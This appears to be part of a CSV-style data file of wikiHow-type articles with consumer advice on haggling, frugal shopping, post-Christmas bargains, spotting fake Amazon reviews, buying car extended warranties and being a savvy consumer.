, Most vendors expect haggling, but offering less than 50% the asking price will only offend them.Asking for a 25 to 50% discount is usually considered reasonable as an initial counteroffer at a flea market, although the final price will more likely be 10-25% below the listed one.

, Saying ""hmmm"" or simply pausing before you reply will make you seem less willing to purchase the item. This gives you more bargaining power.


Simply remaining silent can cause them to respond with a better offer. This works better if you have the seller's full attention. If you're trying to buy a $1 keychain, the seller might just ignore you and move on to another customer!
After a pause, respond with a new offer between your last one and the seller's current offer.

, Continue to show hesitation until the seller reduces the price below your secret ""maximum price"". If the seller won't reduce the price to that amount, try these other tactics:


Agree to their last offer on the condition they throw in another item you're interested in for a reduced rate.Have a friend pretend to pull you away or convince you to move on. This may trigger a final offer from the seller.If you don't have a friend handy, simply start walking away for the same effect. Once you try this, though, you won't get a better deal if you walk right back to the stall!
Pull out the amount of cash you're offering and show it to the seller to tempt them directly. Don't try this with a large amount of money, or anywhere with a high risk of pickpocketing or mugging."
"
Do your research.,
Dress well.,
Make a low but reasonable starting offer.,
Give the other person a reason to change their price.,
Ask about available coupons, sales, or a cash discount.,
Continue negotiating until you agree on a price or the seller balks.,
Keep a close eye on the transaction.",How to Haggle3," Do some preliminary ""homework"" by searching the Internet or visiting other stores to find the lowest prices for the item you want.


Printing out a counteroffer or writing down the website to show the seller during negotiation demonstrates that you've done your research and are willing to go elsewhere.
Make sure you're looking at comparable products. Just because you found a used model for half the price doesn't mean you can get a new one for that amount.If you're considering a house, ask a real estate agent to provide you with a list of comparable listings and sales. Also find out how long the house has been on the market — the longer it has, the more willing the owners will be to sell it at a discount.Familiarize yourself with the product's features and how they compare to similar products. The more knowledgeable you are, the better you'll be able to judge the terms of the deal.

, When negotiating over expensive items, looking your best will garner more respect from the other party. This is especially true if you're negotiating over a house.#Be discreet in your negotiations. If you're purchasing a television or car in a public location, the seller won't want nearby customers to discover they can get a cheaper deal. Keep the volume down and the conversation private to get the best deals., Your earlier research should give you a good idea of how much ""wiggle room"" you have. Be careful not to undershoot and offend the seller.


When shopping for houses, a polite offer is usually 5 to 10% below the listed price., If they don't agree to your offer, you'll need to give them a reason to change their mind. It's difficult to haggle over very expensive items simply by naming prices back and forth.


Point out your loyal customer history if you have one, or offer an additional benefit. If you're buying a car, for instance, offer to have the car serviced at their garage if they sell it to you. If you're selling a home, agree to pay for a repair.
Discuss any flaws in the product, however minor. A small dent or a feature that doesn't live up to its advertisement can be reasons for a discount.Mention dissatisfaction with some aspect of the product, such as the style or lack of associated product (e.g. a wireless keyboard for a computer). Be careful not to insult the seller, especially if they are the craftsman or designer of the product.

, Retailers won't have to pay a credit card fee for a cash transaction, and may pass on that discount to you.Warning: This could backfire if you're trying to buy a house. Having enough cash on hand to buy a house can signify to the seller that you're wealthy enough to afford more.

, Act hesitant until the seller reduces the price to an acceptable level. If the seller won't reach a price you're happy with, try these other tactics:


If you're making an offer on a house, send a polite thank you email to their counteroffer, but don't respond with a counteroffer of your own for several days. This gives them time to worry you might not be interested, and to consider lowering the price.
Say you have a spouse or family member at home that's limiting your budget. You could even fake a call to them if you have to. If the price is ""out of your hands"" the seller might concede some ground.
If all you can get is a mediocre deal, ask the seller how long they can hold that price for you. Quoting that price at other establishments could cause both them and the original one to lower their price., Reading the fine print on your real estate contract or warranty plan is always a good idea. If the final price or terms are different than you expected, immediately bring it up with the other party. You may need to haggle further.

"
"
Never appear enthusiastic.,
Don't haggle when the other party is unwilling.,
Never act rude or condescending.,
Don't get angry or over-invested in the haggling.,
Never haggle over insignificant amounts.,
Don't ask for the seller's ""best price"" and then continue haggling.",How to Haggle4," If you show that you're eager to buy or sell the item, the other party knows they'll be able to get a more attractive price.

, Negotiation is expected when purchasing an expensive item, or when people are trying to get rid of items at a flea market or yard sale. You'll have much less success — and irritate the seller — if you try to bring down the price of a restaurant meal or a bus ticket.


Although the owners of an independent ""mom and pop"" store have the authority to strike deals, they often have a smaller profit margin and less wiggle room for discounts. If they seem offended by your attempt, don't try to continue haggling.
Larger chains and department stores often have a set policy which may or may not include allowing discounts. If the clerk says they are not authorized to do so, try asking to see someone who is.

, Treat the other negotiator well and they will do the same to you.Careful! This does not mean you have to compliment the item you're intending to buy. Appearing enthusiastic shows the seller you are willing to pay more for it.

, Haggling can be fun, but it's a means to an end. If you've been arguing for ten minutes and neither of you have changed your price, more talking is unlikely to help., Bargaining someone $50 away from their initial offer and then refusing to close a 50¢ gap will make the other party regret doing business with you.

, Especially for small items at a flea market, the vendor knows what they're willing to sell for. If they gave you an honest ""best price"" answer they'll only be annoyed if you continue to argue."

Get the seller to make adjustments.,

I'm unemployed / a student / retired.
I only have (X) to spend this month. Can you make that work?

, Try to convince them to tell you how low they'll go, or at least start making concessions.


What's your range of flexibility on this item?If your competitor can sell it for (X), you probably can as well. (Make sure the comparison is reasonable; don't offend the seller with a comparison to a clearly inferior item.)

, If you appear in a rush, they won't have time to convince you to pay more.


I can pay you in full right now if you go down to (X).
I'm only around this afternoon.

, If they didn't want your item, they wouldn't be haggling for it.


I'm sorry, but I really need (X) for that item.
Any lower and I won't be making any money off it.

, If the buyer won't meet your current price, making a conditional deal will get them out of your hair and still let you sell the item if you don't manage to offload it for a better price.


I'm not willing to sell for that price right now. Come back half an hour before closing and I'll consider it then.I'm going to try to sell it at my price. Why don't you leave me a contact number and I'll phone you if no one's purchased it by the end of the sale?, You appear harder to convince if you claim the decision rests with someone else.


I'd love to buy this, but (my wife/my father) won't let me spend that much.
I'm sorry, but it's company policy not to give discounts.
(The owner/the company) sets the prices. Unfortunately I'm not able to adjust them myself.

Use an online cost comparison tool.,
Research major purchases.,
Learn to negotiate.,
Make a shopping list.",How to Be a Frugal Shopper2," Simply type your query into a search engine such as Google or Pricegrabber, and look through the results. Using a cost comparison tool will allow you to see the prices for items at major retailers online. While it will give you a good sense of how much an item may cost online, it won’t let you know the possible lower costs that you get by trying offline options such as yard sales.Use an official cost tool for larger items such as cars. If you are unsure of the value of such an item, do not buy it without consulting a professional or official guide (such as Kelly Blue Book)., Avoid buying a product with the salespersons in the room, especially when you’re pressured to make a commitment now to get the best deal. These are often not the deals you hope they are, and the sales staff is hoping to leverage emotion over reason in order to get you to buy now. Consider the following before you buy:You’ll want to read reviews of products before you buy. This can include professional reviewers, as well as the reviews of fellow shoppers. This will help you get a sense of how durable and functional a product is. This is especially important for electronics, but can be useful for getting good deals on furniture and clothing as well.
Hidden costs can add substantially to a purchase’s overall cost. The most common example is buying a used car that turns out to be a lemon, and needs substantial repairs that weren’t included in the original price or description. But hidden costs can include medical costs if a product is defective or harmful, excessive fees for late payments, and finance charges.Some items require upkeep costs to work or retain their value. For instance, a printer will need toner or ink and paper to work.This is a recurring cost that can affect the overall cost of using the product. Some pieces of furniture, motor vehicles, pianos, etc., will require certain care to make sure they work and retain their value. Make sure to investigate all of the necessary upkeep costs associated with a purchase to understand its true cost., To negotiate a price, start with a figure much lower than you intend to pay, but don't be too ridiculous or people won't take the offer seriously. Then up your offer in reasonable increments in response to their counterargument. For instance, if you are haggling over a bike, and you offer $100 and they offer $500, going up to $175 is reasonable, but going up to $105 is not.Don't be too enthusiastic about an item, or the seller will know they can hike up the price.There are times and places where it's perfectly acceptable to haggle. The car lot is often one, but yard sales and other informal sales are great too. Though you can haggle almost anywhere if the situation is right (such as a going-out-of-business sale or if the product is damaged)., Make sure especially when shopping for food to never shop without a list. Make the list at home of things that you just need and cannot do without. Think about making a list of meals for the week and the ingredients that you will need. Never shop without your list and do not impulse buy. Always use your list and spend the amount of money you have worked out prior to shopping. This avoids picking up impulse items that we don't really need."

Invest in products with lifetime guarantee.,
Invest in the extended warranty.,
Wait longer to replace items when possible.,
Buy in bulk when you can.",How to Be a Frugal Shopper3," Certain companies place a lifetime guarantee on their products, which means that if they break, they’ll often replace them for free. This can be a real money saver in the long term. For instance if you buy a $300 coat with a life-time guarantee, you could save hundreds or even thousands of dollars that you would have spent replacing cheaper (or equivalently priced) coats without a lifetime guarantee. Before shelling out money on such a product, make sure the company is reliable—check the Better Business Bureau, read online reviews and articles, and check out the quality of the products for yourself (in-store, if possible).

, This may not be useful for all items, but a you may want the extra protection when you spill coffee on that new laptop. It is important to ask exactly what the warranty covers and what nullifies the warranty. This can save you thousands of dollars in repair and replacement costs.For expensive gadgets and cars, the warranty is usually worth it. For products that are usually reliable within the original warranty, it's usually not worth it to buy the extended warranty., You may be tempted by a shiny new television, but if it’s still working and still compatible with other electronics, it may not be worth the extra cost. It’s worth noting that some items need to be replaced more frequently and failing to do so can cost you more money. Replacing filters on air conditioners, tires on cars, and clogged valves on dishwashers can make them last longer, and help you save money by extending the lives of the products.Some things need to be replaced for health and safety reasons. A toothbrush should be replaced every three months, pillows every year, mattresses every 5 to 10 years, and fire extinguishers every 10 years., Buying in bulk can be a great saver if you have enough storage space and you know you will be able to use the goods. If you can save a significant amount of money on bulk purchases of perishable items, it may be wise to split your purchase with another person or family. Some items that can really save you money if you buy in bulk: shampoo
toothbrushes
office supplies
alcohol
toilet paper

Create a budget for essentials.,
Add other items.,
Do your research.,
Evaluate your needs.,
Set a budget for wants.",How to Be a Frugal Shopper4," This includes food, bills, transportation costs, etc. Write out all of your utilities, credit card and loan bills, and any recurring essential cost you know you need such as groceries or transportation costs. Subtract these from your monthly net income. Determine a monthly budget for these items that is workable with your income. For instance, if you make $2000/month, it may not be wise to spend 50% of your income on groceries, unless this is accounted for by a lower rent (less than 30%) or lower bills, etc. Remember that you’re budget needs to account for retirement and emergencies before determining a budget for “wants.”
If you are left with little for savings or discretionary spending, you may want to re-evaluate the more flexible costs such as groceries.

, While these items don’t fall under the heading of basic needs, they may be essential for your career, etc. These can include a wardrobe for work or interviews, a laptop or tools for your job, a cellphone that can receive emails, etc. While there can be a lot of ways to trim the budget for these items, such as comparison shopping and getting things on clearance, you’ll need to budget for them before setting the budget for your spending for pleasure., Use online shopping comparisons such as Pricegrabber to determine what you should be paying for certain items. Look at the average rental and mortgage data for your neighborhood, and if you move, be sure to take that into consideration., It's easy for something that is not necessary to feel like a need. However, to be frugal, you need to consider your needs in terms of the basic essential needs: food, water, shelter. Then, the needs that lead to procuring the basics: job (and its tools), transportation, etc. You then evaluate in terms of quality. You may need a car, but you don't need a brand new Maserati. A used Honda or Subaru will do the job just as well, assuming it's in good repair., Nearly everyone has a wish list, whether it’s online, written down, or simply in their minds of things they’d like to buy if they had the money. However, these items often can wait, and should not be prioritized over the necessities. This can include video games, décor items, and certain gadgets. Even a “need” can become a “want” if you’re opting for a version of that “need” that is more expensive than you can afford (for example, spending more on a video game system than you make in a month).Make sure you stick to your budget. If you've created a list of needs and wants, and have determined how much you plan to spend on those needs and wants, then don't splurge. If you feel you need the occasional splurge, then put that in your budget. This way you can be frugal and build your savings."

Plan to buy up Christmas supplies on the cheap.,
Look for good deals on high-demand presents.,
Plan to buy next year's Christmas tree.,
Be ready to buy non-specific holiday goods for New Year's.,
Look for Christmas goods you don't mind using out-of-season.,
Check for deals on non-perishable food.,
Buy everything needed to store your purchases.",How to Save Money by Buying Christmas Bargains After Christmas1," The day after Christmas, most stores have no use for their holiday supplies, so they'll offer major price discounts to get rid of them. Buying next year's Christmas supplies early will cost money now, but you'll save loads of cash compared to what you'd pay in November or December of next year. Below are a few seasonal goods you may want to look for deals on:



Christmas lights: Normally, it can cost over $100 to light a good-sized tree, but after Christmas, the price for these lights plummets. To save even more money on your utility bill, try to find energy-efficient LED lights, which are normally more expensive.Ornaments: If you end up not liking them, you can always save them to give as gifts next year.

Holiday cards: Before you buy these, make sure they aren't dated!

Wrapping supplies: If you see any, try to buy plenty of discounted wrapping paper, ribbons, boxes, and so on with non-Christmas patterns. This way, you can use these things throughout the year.;
, Every year, a few popular products top the list of sought-after Christmas presents. After Christmas, the demand for these products plummets, so you can often find incredible deals on them. A few items that tend to get discounted every year include:Laptops and electronic gadgets: Keep in mind that the Consumer Electronics Show (CES) typically falls in January. If a new product unveiled at this trade show makes another product obsolete, you'll be able get an even better deal on it, so you may want to wait until February for these goods.

Clothing: Many clothing outlets (like, for example, The Gap) hold their biggest sales of the year the day after Christmas. Seasonal clothing will be especially cheap.

Fitness equipment: Deals tend to get best after mid-January when people start to give up on their New Year's resolutions.

Furniture: Not an obvious choice, but since most new collections debut in January or February, it's usually possible to find discounts on last year's.

, If you use an artificial tree, you can sometimes save hundreds on your purchase by waiting until after Christmas. High-end artificial trees can easily retail for over $600, making post-Christmas price cuts on this item especially attractive.Over time, the savings from an artificial tree can add up, especially if you originally bought it on discount. Compared to ""real"" trees, artificial trees are generally more expensive. Use an artificial tree year after year, however, and it will eventually pay for itself. On average, this takes about 2 1/2 years., After the month-long hullabaloo of the Christmas season, it's easy to forget that there's another big holiday right around the corner. Get a leg up on other party-throwers by keeping this simple fact in mind as you make your shopping list. Many discounted seasonal goods and decorations are appropriate for a New Year's party. This is especially true if they don't have Christmas symbols or markings on them.


Don't worry too much about finding holiday goods that don't have Christmas trees, stars, or other obvious symbols on them. For most casual parties, your guests will probably be comfortable using Christmas versions of cups, plates, napkins and so on.

, When something works well, does it really matter if it has a Christmas tree on it? If you answered ""no,"" you're in luck! All sorts of leftover Christmas goods can be used throughout the year as long as you aren't picky about what they look like. A few ideas include:Kitchenware: Plates, china, aprons, baking sheets and so on work perfectly whether or not they're red and green.

Strings of lights: These are a cheap way to add ambiance to a bedroom or dormitory.

Decorative baskets: Good for storage, room accents.

Pillows and Linens: Many Christmas symbols (like lambs, stars, doves, etc.) look fine outside of the season. Solid-color fabrics are even more versatile.

Bath Items: Soaps, lotions, shampoos, and so on are great as gifts or for personal use.

Candles: These add atmosphere and smell great any time of year.

, Most seasonal food products will be discounted after the holidays. Since non-perishable items last the longest, these products can be the smartest buys. For example, buying price-cut treats like candy canes in bulk can give you a taste of the holiday spirit all year round.


Perishables will have the biggest discounts of all because stores will want to get them off the shelves before they spoil. However, if you buy these, you'll need to be prepared to use them right away. Stores won't usually stock seasonal perishables after they stop being in demand, so the things you buy may have been sitting on the shelf for a while.

, Many of the goods above aren't the sorts of things you'll use right away. Some, like Christmas decorations, probably won't be used until next year. As long as you're out shopping for these things, take the time to invest in quality storage materials. You'll get the most value for your money if you can prevent the things you buy from breaking or going bad before you use them. Luckily, things like plastic storage containers are usually cheap year-round.


Artificial Christmas trees require special mention. If you store an artificial tree in the open, it will gather dust, cobwebs, and other unappealing debris. Buy a tree storage bag (usually sold in the same place as the tree itself) to save yourself a time-consuming cleaning session. Be sure to choose a bag that's the proper size for your tree."

Decide if you actually need the item.,
Determine your budget before you go shopping.,
Research the item or service on your own.,
Check the state of an item before you buy it.,
Make sure the sale is a good deal.",How to Be a Savvy Consumer1," As a consumer, you may be tempted to buy an item impulsively, especially if it seems like a good deal. But you should try to be savvy about how you spend your money and avoid buying something just because it is on sale. Instead, make sure the item fits your budget and will not compromise your finances. Only then should you consider purchasing it.Keep in mind salespeople may pressure you into a purchase by using “a good sale” as an incentive to buy. You should always pause and consider if you really can afford the item before you take out your credit card. You should also think about whether or not you need the item as you do not want to simply buy an item for the sake of spending money.;
, You should also set limits on how much you are willing to spend as a consumer before you go shopping. Setting a budget will ensure you do not overspend and that you get the best price for the item or service you are looking for.For example, you may set a limit of $1,000 for your new television, where you cannot spend more than this amount. You may then do research to determine which television models are within your price range and which models have functions and add-ons that you can afford.
You can also discuss your budget with a salesperson if you decide to buy the television in the store. Giving the salesperson a clear budget will allow them to show you the best products for your price range and meet your expectations as a consumer.

, You should educate yourself before you go out and talk to vendors. Research your potential purchase online and gather information about the item or service you are looking for. Look up other details besides the price, such as the possible functions, materials and add-ons of the item. Get a good idea of the best possible item or service available and then compare prices to determine what you can afford.You should also look at consumer reports on the items or service as well as any test results done by independent testers. These reports can help you compare different vendors and determine what your expectations should be as a consumer.
For example, you may be looking for a new television. You should decide how large you want your new television to be as well as what you want the television to do for you. You may research the available televisions on the market and determine which television models are appealing to you.

, You should also spend your money smartly by knowing exactly what you are getting when you purchase something. It should be stated online or in person if an item is new, used, or refurbished. You should be well aware of the state of the item before you purchase it.You should be especially wary of this when you purchase used or refurbished items. Make sure you are clear about what you are buying, especially if there is a “Buyer Beware” note on the item. Once you buy an item, you may not be able to return it or exchange it based on the terms of the transaction.

, Before you buy an item, you should confirm the sale is a good deal. You can do this by comparing the price of the item at several different retailers online or in store. Look for the lowest price for the item, as some retailers may have better sales than others.


You should also make sure the item is good quality for the price. This means determining what the item is made of, or the materials in the item. You should confirm that the item is well made and worth the price tag before you buy it.

Consider the length and tone of the review:


If the review is very short, it may be a fake.,
Check if the review uses emotional language.,
See whether the reviewer has written other reviews.,
Beware if the person has submitted a lot of reviews in a short period.,
Be skeptical if the review admits bias.,
Determine if the item was a ""Verified Purchase."",
Consider whether the reviewer was given the product for free, in exchange for writing a review.,
Look at the ""Customers Also Bought"" section.,
Disregard the highest and lowest ratings.,
Read many reviews and apply critical thinking.,
Leave feedback to help others who are reading reviews.",How to Spot a Fake Review on Amazon," If the writer just wants to affect the overall score, their main intent may be to vote via the ""star"" rating, and to boost or lower it. But because one must write a review as well, the review itself may be very short -- 4 or 5 lines at most.
If the review is vague and doesn't have details about the product itself, it may not be genuine. It uses generalities that could apply to many different books or products.;
, An objective review will usually summarize and critique the content or features of the product. A review with an agenda sidesteps this process.


If the review was written for a friend, the book or item may be merely described as wonderful, great for everybody, amazing, etc., and the reviewer may say that they're planning to purchase one for everyone they know for the holidays.
If the review is by an enemy or rival, on the other hand, the item may be called pathetic, ridiculous, or a waste of time. The reviewer may recommend an alternate product or author that ""has more credibility"" or that you will like better.

, If the person doesn't regularly write reviews, it may not be genuine. Under ""see all my reviews"" next to the reviewer's name, you discover that this reviewer hasn't written any other reviews -- or they've written only a few other short, gushing, vague reviews (for friends), or hit piece reviews (against rivals).

, If a book reviewer is being paid to write reviews, they may have written a great number of short, 5-star reviews for self-published or print on demand titles. Check ""See all my reviews"" next to that person's name to see what else they're reviewing, and to look for a sameness to the reviews.

, The reviewer notes that they haven't read the book or tried the product -- so why are reviewing it? The reviewer means to either raise or lower the star-ratings without submitting a substantive review. Sometimes a low-star review will talk about a list of ingredients, or a book theme they find distasteful, without any indication that they have ever tried that specific product or read that book.

, When evaluating a review, you may also want to know if the person bought the item directly from Amazon; if they did, there will be an orange ""verified purchase"" notation under the reviewer's name and date. This will indicate that the reviewer has actually received the product.

, The review must disclose if the reviewer was sent that item for free in exchange for a review, and you may not feel they can write an unbiased review in that case. But people will often write reviews for items received elsewhere -- for instance, a book may have been a gift, a library copy, or have been purchased elsewhere. Amazon allows people to review items obtained elsewhere, and to post reviews of free products; if honest, reviews in these categories are not considered ""fake"" reviews.

, Usually, this section contains products similar or complimentary to the product you're looking at. But if this section is loaded with products that have nothing to do with the product, something might be going on. For example, let's say you're looking at resistance exercise bands. You see the ""Customers Also Bought"" section contains items unrelated to exercise bands -- grill gloves, green tea supplements and ice cube trays. This could mean that all these product are being given away at a significant discount or for free in exchange for a review, which could bias the reviewers.

, See what people in the middle say for a more accurate assessment of the book or product.


One-star reviews should always be suspect, especially if it's a review for a book by a controversial author.

, Does the review sound like something a doting mother would say? Does it sound like something one's high-school enemy would say?


When reading a review, don't judge it based on whether you share the writer's opinions of the product or book; consider instead if the review is thoughtful, fair, and well-written. Even people who disagree with you may have valid points that warrant a ""helpful"" click.

, If you decide that a review is helpful and objective, on the line at the end that reads ""Was this review helpful to you?"" click ""Yes."" This will help raise the review's credibility. If you decide that the review isn't objective or may have a hidden agenda, click ""No"" to lower that review's status.

Know if you need to buy an extended warranty.,
Find out if you are duplicating the car maker's warranty.,
Shop around thoroughly.,
Research the variety of providers.,
Be wary of potential scams.,
Be clear on what is covered.,
Understand your responsibilities.,
Determine how claims are handled.,
Know who backs the warranty.,
Ask yourself how long you will keep the car.,
Consider your service and repair history.,
Research the reliability of the car model.",How to Buy an Extended Warranty for a Car," The first thing to get clear is whether or not you have to buy an extended warranty or, as it is sometimes known, service contract. Generally you will not be required to buy an extended warranty, it will be an optional extra. If the car dealer tells you that you need to buy an extended warranty in order to qualify for financing, you shouldn't take their word for it. Contact the lender yourself and ask if this is true.If you buy an extended warranty and then discover that your lender didn't require you to, it can be difficult to cancel and you may not get any money back.;
, New cars will come with a warranty from the manufacturer that will typically cover you for the first three years, or around 36,000 miles. One of the factors to consider when thinking about an extended warranty is whether you plan to keep the car much beyond the period covered by the manufacturer.Different manufacturers offer different warranties. Used car warranties will also be different from new car warranties.
Be sure to check the documents on the extended warranty to make sure you are not paying for coverage when your manufacturer's warranty is still valid.
Normally the extended warranty will not come into effect until the manufacturer's warranty expires, but be sure to check.

, You don't have to buy an extended warranty where you bought the car. Since there is so much money made from these plans, you should expect very eager sales staff encouraging you to opt for the extended warranty. Don't be rushed into a decision. Shop around before making any decisions. You can search online for comparisons of warranty providers.Generally you can purchase an extended warranty from the dealer, a warranty company or agent, an insurance company, a credit union, or a broker.You can buy an extended warranty at any point after you have bought the car. You may, however, find that as the car gets appreciably older the rates will go up.
Be prepared to haggle about the price with the sales staff. It might feel unusual but there is evidence that those who haggle can on average to save a few hundred dollars., When you are shopping around you should keep it in mind that there are a vast number of potential suppliers for extended warranties on cars. This open market place has its advantages and disadvantages. The advantages includes a wide variety of providers with numerous deals and offers available to you, but the sheer number of warranty providers can make it hard to see the wood for the trees and find the best deal for you. For example, you might find a better deal with your main car insurance provider rather than the car dealership.


It can be especially difficult to determine the trustworthiness of an online company and navigate your way through the small print and conditions.
Be sure to thoroughly research any company you are considering and check whether they are backed by an insurance firm with your local insurance commission.
Check the company with your local consumer protection agency to see if there have been complaints made in the past, and how they were resolved.It is worth noting that extended warranties which are backed by the car manufacturer are generally rated the best.The minimum requirements for extended warranties will vary by state, but the policy should be available for you to read in a clear and accessible document, with full contact details for the provider.
It should clearly and conspicuously state any deductibles and prior approval procedures for repairs.

, If you are searching for extended warranty deals you may find yourself more susceptible to cold callers or mailings that seem to be offering you an attractive deal. These markets are often subject to dubious practices so it's important to stay vigilant and skeptical. Don't take the information in phone calls or mailings at face value. If they say your warranty is about to expire, check this yourself, it's a sale technique.


Be on the look out for phrases such as ""Final Warranty Notice"" or ""Notice of Interruption"" which are designed to make the situation appear urgent and rush you into a deal.
Never disclose any personal or financial information unless you are completely certain who you are dealing with. This includes your driving licence number.
Always request time to think over any deal. Reputable providers should not try to push you into something., If you do decide to look at buying an extended warranty, you need to carefully appraise the contract you are being offered. This means reading it thoroughly and methodically. It is very rare for a warranty to cover all the possible repairs you could require. Typically some parts are covered and others aren't. As a rule of thumb you should assume that if a part isn't explicitly described as covered in the contract, it probably isn't. Repairs for parts such as the brakes and clutch, are often not included in service contracts.Most warranties cover working parts, not repairs of dings and scratches (cosmetic repairs). Also, normal wear and tear is not normally covered.
There are all sorts of clauses which could reduce your coverage. For example, if a covered part has become damaged by a part that is not covered, you may not be able to claim for the repair.
A common so-called ""escape clause"" is one which covers ""internally lubricated parts"", but only if all the seals and gaskets are intact and in place. For example, if a transmission seal worth a few dollars leaks and the transmission becomes damaged before you have noticed the faulty seal, the provider may refuse to pay for your expensive transmission repair.You may be covered for replacement parts, but not the labour. Depending on the problem, the labour could far outstrip the costs of replacing a part., As part of the contract, you may be required to do certain things to keep the contract valid. For example, you may be obliged to carry out regular services beyond the normal legal requirements. This might include perform oil changes more regularly than is recommended by your auto manufacturer. If you don't realise this and fail to fulfill your responsibilities then you could void the contract, meaning you are not covered and you don't get the money back.


It may be stipulated in the contract that you only take the car to a specific dealer for maintenance. Check this and stick to it. Anything else would be an unauthorized service.To avoid this, be sure you know what you have to do and keep full and complete records of the actions you have taken. Keep hold of all the receipts from services and any maintenance work.

, Before you agree to anything you need to understand how claims are handled. This means being clear on where you can take the car if you need a repair and how the repair is processed. It's important to know who pays for the repair in the first instance. Does the warranty provider pay up-front, or will you have to pay and then get reimbursed afterwards?If this is the case, it could cause a significant strain on your finances in the short-term.


Part of understanding how claims are handled is knowing the level of deductible or excess you will have to pay.
Be sure you check the deductible for any claim before signing up.

, Given the multiplicity of financial service firms and the often complicated structure of businesses which operate by buying and selling things like debt and insurance contracts, it's important to know precisely which company stands behind your warranty. Dealerships sometimes offer warranties that are backed by third parties, not the car manufacturer.


A manufacturer-backed warranty can be used at any dealership, whereas a third party one may be limited to where you bought the car from.These kind of dealer-limited deals are sometimes known as ""Captured Warranties"".
Generally, warranties that are backed by the manufacturer themselves receive the highest customer satisfaction ratings.It is certainly not unheard of for companies that underwrite these kind of warranties to run into financial trouble and go bankrupt., The potential advantages and disadvantages for buying an extended warranty begin with whether or not you intend to keep the car for many years. Think about this carefully and ask how often you tend to trade-in your car. If you are buying a used car to tide you over, an extended warranty may not be a good choice. However, if you tend to run a car into the ground over many years, it may be more advisable., As well as thinking about how long you envisage keeping the car, you should think about your driving history. Do you have an unfortunate habit of driving into parked cars, clipping curbs or scratching the bodywork? If so, and you have found yourself shelling out for repairs in the past, it might be a good idea to get a warranty.


Also consider the standard of your local roads which will affect the wear and tear the car suffers.
You can try to add up the amount you have spent on repairs in the previous years and compare it to the cost of the extended warranty. It's a different car of course, but it will give you an idea of how much you have spent in the past., After looking at your history with repairs, be sure to check the make and model of the car you are going to buy. You can look up reliability facts and statistics online to give you a picture of how your car generally performs over time. This is not an exact science, but it does give you some useful data to inform your decision.You can read up on online car forums as well as specialist magazines to find out about particular models.
All of this information should be reflected in the rate you are quoted, but it is a good idea to be fully informed.

Check online business publications for sales at big-name-brands.,
Check local publications for sales at small businesses near you.,
Check your favorite online retailers for sales in advance.,
Try using coupons for added savings.",How to Save Money by Buying Christmas Bargains After Christmas2," Huge multinational brands plan their after-Christmas sales well in advance. To maximize their sales, they will publish this information in business publications, magazines, and so on. Usually, this information will be run online on Christmas day or slightly before it, making this a convenient way to look for bargains.


One good place to start is the International Business Times, which runs a yearly online article on after-Christmas sales at well-known retailers. For example, here is IBT's article for 2014., Local mom-and-pop stores usually run after-Christmas sales just like bigger brands. However, you won't often be able to find information about these sales online as easily. Try looking in the ads section of your local newspaper or visiting a community bulletin board for information on after-Christmas deals in your local area.


If you have the time, you can also try looking on individual stores' websites or social media pages for information. As a last resort, you can call stores one by one — this is somewhat more time-consuming, but it works just as well as the methods above.

, You don't necessarily have to leave your house to get great savings after Christmas. Large online sellers (like Amazon.com, etc.) usually have drastic after-Christmas sales just like their brick-and-mortar counterparts. Best of all, it only takes a few clicks to check these sites for deals, so you can do it the day after Christmas in a matter of minutes.


See our guide to smart online shopping for more info.

, Not all retailers will allow you to ""stack"" coupon savings on top of after-Christmas discounts, but if you do get this chance, you can save even more than you normally would. Always be on the lookout for a good deal.


Traditional paper coupons can be easily found in your local newspaper. However, today, electronic coupons are even more convenient. Try searching your retailer's site for deals you can print or download to your mobile device and redeem at the store.Also be aware that sites like Coupons.com, Groupon.com, and Thekrazycouponlady.com offer numerous coupons year-round.

Read reviews of the vendor online.,
Ask the vendor for referrals from other customers.,
Check social media.",How to Be a Savvy Consumer2," You should always do research on vendors before you buy from them. This means reading reviews of specific products online as well as reviews of the vendor or seller. You should make sure the vendor has a high rating online and mostly positive reviews from buyers.You can also read the company’s report with the Better Business Bureau and Consumer Reports. If the company requires licensing to operate, you should contact the licensing authority to confirm the company is properly licensed and has no record of disciplinary action.
You should also make sure there is legitimate contact information for the vendor available online and in person. The vendor or seller should have an address and a phone number that you can verify is real and legitimate.

, You should also confirm the vendor is trustworthy by asking them for referrals from other customers. There may be referrals available on the vendor’s website and in their promotional material.Check to see if the referrals appear to be written by third party individuals, such as customers who have a history of using the vendor in the past. You should also check that the referrals are written by customers who have written many referrals for other businesses and services. Often, customers with many referrals for a variety of businesses will be discerning, savvy consumers.

, You can also get an idea of the business's customer experience by checking their social media accounts. In particular, Facebook allows for customer complaints or praise to be displayed prominently and gives the business a chance to respond. Look out unanswered complaints or a lack of positive comments when reading through the page. Businesses are aware that most customers check their Facebook before making a purchase, so reputable ones will strive to maintain a professional presence there.

Never give out personal banking information to unknown parties.,
Read and understand all contracts before you sign.,
Keep copies of all transactions for your records.",How to Be a Savvy Consumer3," Do not provide any personal banking information, such as your banking institution and account number or credit card number to vendors you do not know or recognize. Do not open emails or site offers that require you to provide personal banking information for access, as these are likely scams.Trustworthy vendors will only ask you for your personal banking information once you have agreed to purchase an item or service online. Many vendors will use certified processing tools or sites to complete your purchase online. Legitimate vendors will have safeguards in place to protect your personal banking information from theft.

, You should make sure you understand exactly what you are signing by reading all contracts thoroughly, including the fine print. A trustworthy vendor will be transparent and willing to explain any details of the contract that confuse you or are unclear to you.You should check that the contract protects you as a consumer and does not limit or restrict you from returning or exchanging an item. If there is print that restricts you from doing this, you should be aware of it and willing to agree to it.
If the sales pitch by the vendor includes details not in the contract, you should clarify this and request that it is added to the contract in writing. This will ensure you are protected as a consumer and that the contract is clear to both you and the vendor.

, As a savvy consumer, you should always keep copies of your receipts and contracts for all items and services you buy. Having a record of your receipts will ensure you know exactly where your money goes and that you have information on hand in the event of a dispute with a vendor or seller.You should also always keep records of any warranties you have for items you buy. Make sure you keep a copy of the warranty for at least the duration of the warranty, as you will need it in the event of an issue or incident with the item.
There are apps available that you can download on your phone to help you keep track of your receipts, many of them free. These apps are easy to use and make it easy for you to maintain a record of your transactions without having to sift through piles of paper."

Join the vendor's subscriber or preferred list.,
Go for a used or refurbished item.,
Use coupons.,
Check for sales during peak shopping times.",How to Be a Savvy Consumer4," Subscribe to updates from your favorite vendors. These lists may provide special discounts or sale access. Many vendors offer email updates to subscribers that advertise the latest products and sales. Some vendors may also offer special discounts and advanced items to email subscribers or those in a buying club or something similar.


You may want to be selective about which vendors you subscribe to, as your email box may become stuffed with vendor emails over time. Subscribing to only vendors you like or value will ensure you read every offer and find deals you will use.
Watch out for buying clubs that cost a monthly or annual fee. In many cases, these will not provide adequate discounts to be worth it.

